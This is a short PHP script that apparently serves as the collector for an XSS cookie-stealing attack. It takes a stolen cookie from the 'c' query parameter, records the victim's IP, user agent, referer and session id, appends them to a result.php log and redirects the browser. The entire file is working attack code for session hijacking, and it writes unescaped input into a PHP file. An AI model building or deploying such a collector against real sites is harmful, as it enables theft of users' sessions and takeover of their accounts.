<?php 

	$ip =  $_SERVER['REMOTE_ADDR'];
	$referer = $_SERVER['HTTP_REFERER'];
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$data = $_GET['c'];
	$seesionid= explode(';',$_GET['c']);
	$time = date('Y-m-d G:i:s A');
	$text = "<br><br>".$time." = ".$ip."<br><br>User Agent: ".$agent.
"<br><br>Referer:".$referer."<br><br>Cookie:".$data."<br><br>Session:".$seesionid[0]."<br<br><br>";
	$file = fopen ('result.php','a');
	fwrite ($file, $text);
	fclose($file);
	header('Location: http://localhost/xss/result.php');
?>


